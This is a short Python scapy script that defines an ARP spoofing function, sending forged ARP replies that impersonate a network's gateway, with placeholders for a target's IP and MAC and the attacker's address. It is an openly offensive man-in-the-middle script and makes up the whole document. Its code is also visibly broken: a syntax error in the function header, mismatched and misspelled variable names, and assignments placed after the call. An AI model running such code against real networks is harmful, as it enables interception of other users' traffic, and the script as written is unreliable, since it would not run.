from scapy.all import ARP, Ether, send

def arp_spoof(target_ip_, target_mac_, gateway_ip_);
  arp_request_ = ARP(op=2, pdst=target_ip_, psrc=gateway_ip_, hwdst=target_mac_)
  send(arp_request, verbose=0)

  target_ip = "<enumerated_IP_Address"
  target_mac_ = "<enumerated_Mac_Address>"
  getway_ip_ ="<Attackers_IP_Address>"

arp_spoof(target_ip_, target_mac_, gateway_ip_)
